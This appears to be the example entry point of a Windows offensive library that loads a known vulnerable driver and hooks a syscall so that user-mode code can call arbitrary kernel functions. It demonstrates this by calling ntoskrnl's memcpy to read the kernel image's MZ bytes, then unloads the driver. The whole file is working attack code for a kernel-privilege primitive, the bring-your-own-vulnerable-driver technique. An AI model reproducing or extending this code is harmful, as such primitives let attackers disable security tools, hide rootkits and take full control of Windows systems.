#include "vdm_ctx/vdm_ctx.h"

int __cdecl main(int argc, char** argv)
{
	const auto [drv_handle, drv_key] = vdm::load_drv();
	if (!drv_handle || drv_key.empty())
	{
		std::printf("[!] unable to load vulnerable driver...\n");
		return -1;
	}

	vdm::vdm_ctx vdm;
	const auto ntoskrnl_base =
		reinterpret_cast<void*>(
			util::get_module_base("ntoskrnl.exe"));

	const auto ntoskrnl_memcpy =
		util::get_kernel_export("ntoskrnl.exe", "memcpy");

	std::printf("[+] drv_handle -> 0x%x, drv_key -> %s\n", drv_handle, drv_key.c_str());
	std::printf("[+] %s physical address -> 0x%p\n", vdm::syscall_hook.first, vdm::syscall_address.load());
	std::printf("[+] ntoskrnl base address -> 0x%p\n", ntoskrnl_base);
	std::printf("[+] ntoskrnl memcpy address -> 0x%p\n", ntoskrnl_memcpy);

	short mz_bytes = 0;
	vdm.syscall<decltype(&memcpy)>(
		ntoskrnl_memcpy,
		&mz_bytes,
		ntoskrnl_base,
		sizeof mz_bytes
	);
	std::printf("[+] kernel MZ -> 0x%x\n", mz_bytes);

	if (!vdm::unload_drv(drv_handle, drv_key))
	{
		std::printf("[!] unable to unload vulnerable driver...\n");
		return -1;
	}

	std::printf("[+] press any key to close...\n");
	std::getchar();
}